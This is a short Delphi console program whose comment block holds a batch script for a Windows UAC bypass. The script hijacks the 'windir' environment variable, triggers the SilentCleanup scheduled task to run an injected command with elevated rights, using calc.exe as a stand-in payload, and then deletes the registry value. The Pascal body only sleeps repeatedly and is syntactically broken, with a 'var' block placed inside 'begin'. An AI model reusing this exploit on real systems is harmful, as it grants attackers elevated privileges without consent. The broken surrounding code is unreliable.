program QuietShower_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
echo "ShedTaskUAC.bat"
@echo off
timeout /t 3 >nul
reg add "HKCU\Environment" /v "windir" /d "cmd /c start calc.exe&REM " >nul
timeout /t 5 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F
timeout /t 2 >nul

}

uses
  SysUtils,
  windows,
  timer;

begin
var
  tid: UINT;

  try
    //start timeout of 5 seconds
    sleep(5000);

    sleep(5000);

    sleep(5000);

    sleep(5000);
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
